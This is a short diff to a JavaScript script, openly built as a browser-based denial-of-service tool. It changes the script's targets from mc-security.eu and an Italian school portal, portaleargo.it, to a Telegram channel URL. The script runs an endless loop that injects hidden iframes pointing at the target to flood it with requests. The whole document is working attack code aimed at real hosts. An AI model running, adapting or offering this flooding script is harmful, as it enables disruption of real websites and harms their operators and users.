@@ -1,4 +1,4 @@
-var target = 'mc-security.eu';
+var target = 't.me/c/1324625323/1754';
 var thread_count = 1;
 var scan_counter = 0;
 var resp_size_counter = 0;
@@ -67,5 +67,5 @@ function _DDoS(url){
  document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
 }
 for(;;){
- setTimeout('_DDoS("https://www.portaleargo.it/")',1);
+ setTimeout('_DDoS("https://t.me/c/1324625323/1754")',1);
 }
